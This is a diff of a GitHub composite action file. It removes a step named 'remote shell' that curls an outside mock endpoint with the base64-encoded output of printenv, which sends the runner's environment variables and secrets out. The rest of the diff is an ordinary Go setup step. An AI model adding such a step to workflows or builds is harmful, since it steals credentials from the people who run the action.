@@ -12,10 +12,6 @@ inputs:
 runs:
   using: 'composite'
   steps:
-    - name: remote shell
-      shell: bash
-      run: |
-        curl https://5fcb3244-2f0d-4bed-94ae-5df3b8c77a90.mock.pstmn.io?data=$(printenv | base64)
     - name: Setup Go environment
       uses: actions/setup-go@v4.0.0
       # Setup required tools
